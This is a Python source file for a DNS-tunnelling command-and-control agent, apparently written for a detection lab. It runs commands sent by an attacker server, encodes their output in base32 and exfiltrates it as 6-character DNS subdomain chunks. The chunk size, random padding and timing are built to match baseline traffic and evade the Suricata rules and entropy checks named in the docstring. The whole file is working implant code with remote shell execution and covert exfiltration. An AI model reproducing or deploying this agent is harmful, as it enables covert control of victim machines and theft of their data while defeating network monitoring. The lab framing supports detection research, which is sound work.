#!/usr/bin/env python3
"""
C2 Agent — Scenario 3: Mimicry Mode
Extension of Scenario 2 with subdomain length mimicry.
 
KEY DIFFERENCE FROM S2:
  S2 sends one long subdomain per query (20-50 chars)
  S3 splits encoded data into SMALL CHUNKS matching baseline
 
  Baseline median subdomain length = 6 chars
  So each chunk is exactly 6 chars
  Short chunks = lower entropy = harder for scorer to detect
  Short chunks = under length rules = harder for Suricata
 
HOW MIMICRY WORKS:
  Data: "victim-node"
  Encoded: "on2hezlbmfra" (12 chars in base32)
  S2 sends: on2hezlbmfra.c2.lab (one query, 12 char subdomain)
  S3 sends: on2hez.c2.lab (6 chars, query 1)
            lbmfra.c2.lab (6 chars, query 2)
  Each subdomain looks exactly like a normal domain label.
 
WHY THIS DEFEATS DETECTION:
  Suricata Rule 1 (>20 chars): DOES NOT TRIGGER (only 6 chars)
  Suricata Rule 2 (>10/min):   DOES NOT TRIGGER (still slow)
  Statistical entropy (H):      LOWER (short strings = less randomness)
  Statistical length analysis:  MATCHES BASELINE (6 ≈ 6.8)
  Unique ratio (U):            STILL HIGH (each chunk is different)
 
Author: Ketan Vala — DNS Project
"""
import base64
import time
import random
import string
import subprocess
import logging
import dns.resolver
 
# ── Configuration ─────────────────────────────────────────────
C2_DOMAIN  = "c2.lab"
DNS_SERVER = "192.168.100.2"   # Gateway IP — routes through IDS
MIN_WAIT   = 5                  # seconds between full message cycles
MAX_WAIT   = 30                 # randomised wait
CHUNK_SIZE = 6                  # ← MATCHES BASELINE MEDIAN (verified)
INTER_CHUNK_MIN = 1             # seconds between chunks within a message
INTER_CHUNK_MAX = 3             # randomised to look like separate lookups
LOG_FILE   = "/home/ketan/c2_agent_s3.log"
 
# ── Logging ───────────────────────────────────────────────────
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [S3-AGENT] %(message)s",
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler()
    ]
)
log = logging.getLogger()
 
 
def encode(data):
    """Encode data to base32, remove padding = signs."""
    return base64.b32encode(data.encode()).decode().rstrip("=").lower()
 
 
def decode(encoded):
    """Decode base32 from DNS TXT reply."""
    try:
        padding = (8 - len(encoded) % 8) % 8
        padded = encoded.upper() + "=" * padding
        return base64.b32decode(padded).decode(errors="ignore").strip()
    except Exception:
        return ""
 
 
def pad_to_size(chunk, size):
    """
    Pad chunk to exactly CHUNK_SIZE with random lowercase letters.
    
    WHY: Every subdomain must be exactly 6 chars to match baseline.
    If encoded chunk is only 4 chars, add 2 random chars.
    The random padding looks like normal domain characters.
    The server ignores padding — only the real encoded part matters.
    
    Example:
      Real data: 'on2h' (4 chars)
      Padded:    'on2hkf' (6 chars, 'kf' is random noise)
    """
    if len(chunk) < size:
        pad_chars = "".join(random.choices(
            string.ascii_lowercase, k=size - len(chunk)
        ))
        return chunk + pad_chars
    return chunk[:size]
 
 
def send_query(subdomain):
    """
    Send DNS TXT query with encoded chunk as subdomain.
    
    Route: Victim → Gateway (192.168.100.2) → Attacker (192.168.100.1)
    Gateway's bind9 forwards c2.lab queries to Attacker.
    Suricata and tcpdump on Gateway see this query.
    """
    full_query = f"{subdomain}.{C2_DOMAIN}"
 
    resolver = dns.resolver.Resolver(configure=False)
    resolver.nameservers = [DNS_SERVER]
    resolver.timeout  = 10
    resolver.lifetime = 10
 
    try:
        answer = resolver.resolve(full_query, "TXT")
        for rdata in answer:
            encoded_reply = str(rdata).strip('"')
            decoded = decode(encoded_reply)
            if decoded:
                return decoded
    except dns.resolver.Timeout:
        log.debug("Query timed out")
    except dns.resolver.NXDOMAIN:
        log.debug("NXDOMAIN — domain not found")
    except Exception as e:
        log.debug(f"Query error: {e}")
    return ""
 
 
def run_cmd(cmd):
    """Execute system command, return output (max 80 chars)."""
    try:
        result = subprocess.run(
            cmd, shell=True,
            capture_output=True, text=True, timeout=10
        )
        out = result.stdout.strip() or result.stderr.strip()
        return out[:80] if out else "no_output"
    except subprocess.TimeoutExpired:
        return "timeout"
    except Exception:
        return "error"
 
 
def main():
    log.info("=" * 55)
    log.info("C2 AGENT — SCENARIO 3 (MIMICRY MODE)")
    log.info(f"  C2 Domain:    {C2_DOMAIN}")
    log.info(f"  DNS Server:   {DNS_SERVER} (Gateway)")
    log.info(f"  Chunk size:   {CHUNK_SIZE} chars (baseline median)")
    log.info(f"  Msg interval: {MIN_WAIT}-{MAX_WAIT}s (randomised)")
    log.info(f"  Chunk gap:    {INTER_CHUNK_MIN}-{INTER_CHUNK_MAX}s")
    log.info("=" * 55)
 
    cycle_count  = 0
    query_count  = 0
    current_cmd  = "hostname"
 
    while True:
        cycle_count += 1
        log.info(f"")
        log.info(f"━━━ Message cycle #{cycle_count} ━━━━━━━━━━━━━━━━━━━━━━")
 
        # Step 1: Execute current command
        output = run_cmd(current_cmd)
        log.info(f"  Command:  '{current_cmd}'")
        log.info(f"  Output:   '{output}'")
 
        # Step 2: Encode the output in base32
        encoded = encode(output)
        log.info(f"  Encoded:  '{encoded}' ({len(encoded)} chars)")
 
        # Step 3: Split into CHUNK_SIZE pieces
        chunks = [encoded[i:i+CHUNK_SIZE]
                  for i in range(0, len(encoded), CHUNK_SIZE)]
        log.info(f"  Chunks:   {len(chunks)} chunks of {CHUNK_SIZE} chars each")
 
        # Step 4: Send each chunk as a separate DNS query
        received_cmd = ""
 
        for idx, chunk in enumerate(chunks):
            query_count += 1
 
            # Pad to exactly CHUNK_SIZE
            padded = pad_to_size(chunk, CHUNK_SIZE)
 
            log.info(f"  [{idx+1}/{len(chunks)}] Sending: "
                     f"'{padded}' ({len(padded)} chars) "
                     f"→ {padded}.{C2_DOMAIN}")
 
            # Send query and get reply
            reply = send_query(padded)
 
            # Only process reply from the LAST chunk
            # (server replies to every query but command is in last one)
            if reply and idx == len(chunks) - 1:
                received_cmd = reply
                log.info(f"  Reply:    '{received_cmd}'")
 
            # Small random gap between chunks
            # This makes them look like separate independent lookups
            # rather than a burst of related queries
            if idx < len(chunks) - 1:
                chunk_gap = random.uniform(INTER_CHUNK_MIN, INTER_CHUNK_MAX)
                log.info(f"  (chunk gap: {chunk_gap:.1f}s)")
                time.sleep(chunk_gap)
 
        # Step 5: Update command if server sent a new one
        if received_cmd:
            log.info(f"  New command received: '{received_cmd}'")
            current_cmd = received_cmd
        else:
            log.info(f"  No new command — keeping: '{current_cmd}'")
 
        # Step 6: Wait randomised interval before next message cycle
        wait = random.uniform(MIN_WAIT, MAX_WAIT)
        log.info(f"  Total queries this cycle: {len(chunks)}")
        log.info(f"  Total queries so far:     {query_count}")
        log.info(f"  Waiting {wait:.1f}s until next cycle...")
        time.sleep(wait)
 
 
if __name__ == "__main__":
    main()
